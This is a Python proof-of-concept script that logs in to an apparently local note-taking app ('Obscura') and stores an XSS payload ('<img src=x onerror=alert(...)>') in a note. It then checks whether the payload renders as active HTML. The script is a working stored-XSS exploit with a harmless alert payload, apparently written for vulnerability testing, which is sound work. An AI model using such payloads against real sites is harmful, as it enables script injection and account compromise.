import sys
import getpass
import requests
from bs4 import BeautifulSoup

# Usage:
# python poc.py http://localhost:8081
# python poc.py http://localhost:8082

if len(sys.argv) != 2:
    print("Usage: python poc.py http://localhost:8081")
    sys.exit(1)

base = sys.argv[1].rstrip("/")
session = requests.Session()

username = input("Username: ")
password = getpass.getpass("Password: ")

login = session.post(
    f"{base}/login.php",
    data={"username": username, "password": password},
    timeout=15
)

if "login.php" in login.url:
    print("[-] Login failed.")
    sys.exit(1)

payload = '<img src=x onerror="alert(\'XSS_SUCCESS\')">'

response = session.post(
    f"{base}/note_edit.php",
    data={
        "title": "XSS PoC Test",
        "content": payload
    },
    timeout=15
)

if response.status_code != 200:
    print("[-] Note request failed:", response.status_code)
    sys.exit(1)

soup = BeautifulSoup(response.text, "html.parser")

active_payload = soup.find(
    "img",
    attrs={"onerror": "alert('XSS_SUCCESS')"}
)

print("\n=== OBSCURA STORED XSS TEST ===")
print("Target:", base)
print("Final URL:", response.url)

if active_payload:
    print("[+] VULNERABLE: Active XSS HTML found in the rendered note.")
    print("[!] Open the note in your browser to confirm the alert executes.")
else:
    print("[-] NOT EXPLOITED: Active XSS HTML was not found.")
